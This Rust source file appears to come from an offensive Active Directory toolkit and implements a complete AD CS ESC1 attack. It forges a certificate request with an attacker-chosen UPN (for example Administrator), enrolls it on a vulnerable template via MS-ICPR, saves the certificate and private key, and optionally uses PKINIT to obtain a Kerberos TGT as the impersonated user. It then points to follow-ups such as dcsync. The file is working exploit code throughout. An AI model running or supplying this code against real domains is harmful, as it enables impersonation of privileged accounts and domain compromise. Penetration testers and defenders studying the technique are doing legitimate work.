//! **1.4.8-A WS-ESC1-EXPLOIT.** Full AD CS ESC1 attack chain — end-to-end
//! from CSR construction to TGT acquisition via PKINIT:
//!
//! 1. Build a PKCS#10 CSR whose Subject Alternative Name carries the target UPN.
//! 2. Submit the CSR via MS-ICPR (`ICertRequestD::CertServerRequest`, opnum 0)
//!    over sealed `\PIPE\cert` — dcerpc handles the transport.
//! 3. Parse the CA response. Disposition 3 = ISSUED → cert DER returned; anything
//!    else = policy rejection with the CA's `Denied by Policy Module ...` string.
//! 4. Optional `--pkinit`: use the issued cert to authenticate to the KDC via
//!    PKINIT (`ms-pkca` client). On success, an MIT ccache containing the
//!    impersonated principal's TGT is written to `<subject>.ccache`.
//!
//! The PKINIT leg surfaces the KB5014754 strong-mapping-enforcement outcome
//! explicitly: on a hardened DC, the TGT request fails with
//! `KDC_ERR_CANT_VERIFY_CERTIFICATE (error 66)` because a UPN-only cert lacks
//! the SID mapping the KDC now requires. The cert is still issued (the template
//! is still vulnerable) — only the escalation path is closed.

use anyhow::Result;
use clap::Parser;

#[derive(Parser)]
pub(crate) struct Esc1Args {
    #[command(flatten)]
    pub auth: crate::shared_args::SmbAuth,
    /// CA name, e.g. corp-CA
    #[arg(long)]
    pub ca: String,
    /// Vulnerable template name (enrollee-supplies-subject), e.g. VulnUser
    #[arg(long)]
    pub template: String,
    /// UPN to impersonate via the SAN, e.g. Administrator@corp.local
    #[arg(long)]
    pub upn: String,
    /// Output path for the issued cert (DER); the private key is written alongside as .key.pem
    #[arg(long, default_value = "esc1.crt")]
    pub out: String,
    /// After issuing, PKINIT with the cert to obtain a TGT as the impersonated user (→ .ccache)
    #[arg(long)]
    pub pkinit: bool,
    /// KDC `host[:port]` for --pkinit (defaults to --host)
    #[arg(long)]
    pub kdc: Option<String>,
}

/// **1.4.8-A WS-ESC1-EXPLOIT.** AD CS ESC1: build a PKCS#10 CSR whose SAN is
/// the target UPN, enroll it on an enrollee-supplies-subject template via
/// MS-ICPR, and save the issued client-auth cert + key. The cert can then
/// PKINIT as the impersonated principal.
///
/// Wraps [`esc1_impl`] in a `StageChecklist` so the run-end card names the
/// exact pipeline stage that stopped (parity with every other attack verb from
/// 1.4.6+). Six stages: `build CSR → SMB connect → submit ICPR → parse issue
/// response → write cert + key → PKINIT (optional)`.
pub(crate) async fn esc1(a: Esc1Args) -> Result<()> {
    let mut checklist = crate::ui::StageChecklist::new([
        "build CSR (UPN SAN)",
        "SMB connect + IPC$ tree",
        "submit CSR via MS-ICPR",
        "parse CA issue response",
        "write cert + key",
        "PKINIT to TGT (--pkinit)",
    ]);
    let result = esc1_impl(a, &mut checklist).await;
    match &result {
        Ok(()) => checklist.render("ESC1 stages"),
        Err(e) => {
            let brief = format!("{e:#}")
                .lines()
                .next()
                .unwrap_or("failed")
                .chars()
                .take(80)
                .collect::<String>();
            checklist.mark_current_failed(brief);
            checklist.render("ESC1 stages (failed)");
        }
    }
    result
}

async fn esc1_impl(a: Esc1Args, checklist: &mut crate::ui::StageChecklist) -> Result<()> {
    use smb2_client::SmbClient;

    let subject = a.upn.split('@').next().unwrap_or("adhammer");
    let csr = adhammer_kerberos::csr::build_csr(subject, Some(&a.upn))?;
    checklist.record_ok(
        "build CSR (UPN SAN)",
        format!("subject={subject}, SAN upn={}", a.upn),
    );
    eprintln!("[*] CSR built (subject CN={subject}, SAN upn={})", a.upn);

    let mut smb = SmbClient::connect(&a.auth.host).await?;
    smb.login(&a.auth.host, &a.auth.domain, &a.auth.user, &a.auth.password)
        .await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.auth.host))
        .await?;
    checklist.record_ok(
        "SMB connect + IPC$ tree",
        format!("\\\\{}\\IPC$", a.auth.host),
    );

    let r = dcerpc::icpr::request_cert(
        &mut smb,
        &a.ca,
        &a.template,
        &csr.der,
        &a.auth.domain,
        &a.auth.user,
        &a.auth.password,
        &a.auth.host,
    )
    .await?;
    checklist.record_ok(
        "submit CSR via MS-ICPR",
        format!("template={}, CA={}", a.template, a.ca),
    );

    // Disposition: 3 = ISSUED, 5 = UNDER SUBMISSION (pending).
    if r.disposition == 3 && !r.cert_der.is_empty() {
        checklist.record_ok(
            "parse CA issue response",
            format!("ISSUED ({} bytes cert DER)", r.cert_der.len()),
        );
        std::fs::write(&a.out, &r.cert_der)?;
        let key_path = format!("{}.key.pem", a.out);
        std::fs::write(&key_path, &csr.key_pem)?;
        checklist.record_ok("write cert + key", format!("{} + {}", a.out, key_path));
        println!(
            "[+] ESC1: certificate ISSUED for UPN {} → {} ({} bytes), key → {}",
            a.upn,
            a.out,
            r.cert_der.len(),
            key_path
        );

        if a.pkinit {
            let kdc = a.kdc.clone().unwrap_or_else(|| a.auth.host.clone());
            let realm = a
                .upn
                .split('@')
                .nth(1)
                .unwrap_or(&a.auth.domain)
                .to_string();
            match adhammer_kerberos::pkinit::pkinit_with_cert(
                subject,
                &realm,
                &kdc,
                &csr.key_pem,
                Some(&r.cert_der),
            )
            .await
            {
                Ok(tgt) => {
                    let ccache = format!("{subject}.ccache");
                    std::fs::write(&ccache, tgt.ccache.expose())?;
                    checklist.record_ok(
                        "PKINIT to TGT (--pkinit)",
                        format!("TGT for {subject}@{realm} → {ccache}"),
                    );
                    println!("[+] PKINIT OK — TGT obtained as {subject}; ccache → {ccache}");
                    println!(
                        "    KRB5CCNAME={ccache} → use for Kerberos auth (dcsync, exec via -k, …)"
                    );
                }
                Err(e) => {
                    // Not a stage failure — the cert IS issued; PKINIT is just the optional
                    // escalation leg. Record as OK with the outcome so the card shows the honest
                    // "template vulnerable, but KDC enforced strong mapping (KB5014754)" story.
                    let brief = if e.to_string().contains("error 66") {
                        "PKINIT rejected — KB5014754 strong mapping (cert issued, escalation blocked)".to_string()
                    } else {
                        format!("PKINIT failed: {e}").chars().take(80).collect()
                    };
                    checklist.record_ok("PKINIT to TGT (--pkinit)", brief);
                    println!("[-] PKINIT with the issued cert failed: {e:#}");
                    if e.to_string().contains("error 66") {
                        println!("    (KDC_ERR_CANT_VERIFY_CERTIFICATE — likely strong certificate-mapping");
                        println!("     enforcement (KB5014754): a UPN-only cert has no SID mapping to the");
                        println!("     target, so the KDC refuses it. ESC1 escalation is mitigated on this DC.");
                        println!("     The cert was still issued — the template is vulnerable.)");
                    }
                }
            }
        } else {
            checklist.record_ok("PKINIT to TGT (--pkinit)", "skipped (no --pkinit)");
            println!(
                "    next: --pkinit to turn this cert into a TGT as {}",
                subject
            );
        }
    } else {
        // Not-issued path — CA rejected. Record the actual reason so the failed card
        // names the CA-side gate (typical: template not on CA's issuance list,
        // template requires manager approval, requester not permitted to enroll).
        anyhow::bail!(
            "enrollment not issued (disposition {}): {}",
            r.disposition,
            r.message
        );
    }
    Ok(())
}
